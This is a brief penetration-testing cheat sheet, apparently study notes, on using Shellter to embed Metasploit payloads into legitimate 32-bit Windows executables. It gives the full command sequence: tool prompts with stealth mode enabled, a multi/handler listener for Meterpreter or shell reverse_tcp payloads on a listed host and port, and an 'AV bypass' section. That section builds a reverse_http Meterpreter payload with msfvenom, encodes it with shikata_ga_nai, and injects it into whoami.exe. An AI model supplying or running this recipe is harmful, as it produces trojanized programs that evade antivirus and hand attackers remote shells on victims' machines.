# Shellter

### Installing shellter

```bash
sudo apt install shellter -y
```

### Usage

#### Choose operation mode&#x20;

* Auto (A)

#### PE Target

* file location of legitimate 32 bit Windows executable

{% hint style="info" %}
A copy of the legitimate exe will be saved in `Shellter_Backups\<name_of_exe>`
{% endhint %}

#### Enable Stealth Mode?

* Y

#### Use a listed payload or custom?&#x20;

* L

#### Set the relevant Lhost and Lports

### Setup Metasploit listener

```bash
use multi/handler
```

```bash
set payload windows/meterpreter/reverse_tcp
```

OR

```bash
set payload windows/shell/reverse_tcp
```

```bash
set lhost 192.168.131.52
set lport 443
```

```bash
run
```

<details>

<summary>Bypass AV (shikata_ga_nai)</summary>

```bash
$ cp /usr/share/windows-resources/binaries/whoami.exe .
$ msfvenom -p windows/meterpreter/reverse_http LHOST=192.168.119.160 LPORT=80 -e x86/shikata_ga_nai -i 9 -f raw > met.bin

# sudo shellter
mode : A
file path : /home/kali/Documents/poultry/whoami.exe
stealth mode: N
payload select : C
payload : /home/kali/Documents/poultry/met.bin
dll loader? N
```

</details>

